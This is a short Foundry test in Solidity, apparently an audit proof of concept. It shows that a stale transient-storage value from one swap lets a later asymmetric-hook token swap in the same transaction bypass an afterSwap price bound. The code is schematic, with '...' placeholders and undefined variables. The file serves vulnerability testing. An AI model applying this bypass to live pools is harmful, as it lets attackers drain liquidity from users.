pragma solidity 0.8.24;
import 'forge-std/Test.sol';

contract StaleTstoreAcrossSwapsTest is Test {
    // tokenA: BEFORE_SWAP=1, AFTER_SWAP=1 (normal token)
    // tokenB: BEFORE_SWAP=0, AFTER_SWAP=1 (attacker's asymmetric token)
    // Pricing bounds for tokenB: maxAmount = 100 tokens per swap

    function testStaleTstoreFromPriorSwapBypassesPriceCheck() public {
        vm.startPrank(attacker);

        // Step 1: Swap tokenA for 100 units (writes 100 to tstore)
        amm.swap(poolKeyA, IPoolManager.SwapParams({amountSpecified: -100, ...}), hookData);

        // Step 2: Swap tokenB for 10000 units in SAME transaction
        // beforeSwap NOT called (BEFORE_SWAP flag disabled for tokenB)
        //   -> tstore unchanged, still reads 100 from tokenA's swap
        // afterSwap IS called for tokenB
        //   -> reads 100 from tstore
        //   -> validates 10000-unit swap against stale 100 reference -> WRONG
        amm.swap(poolKeyB, IPoolManager.SwapParams({amountSpecified: -10000, ...}), hookData);

        vm.stopPrank();

        // Large tokenB swap succeeded despite maxAmount=100 pricing bound
        assertGt(tokenB.balanceOf(attacker), 1000,
            'Large swap bypassed afterSwap price check via stale tstore from prior swap');
    }
}

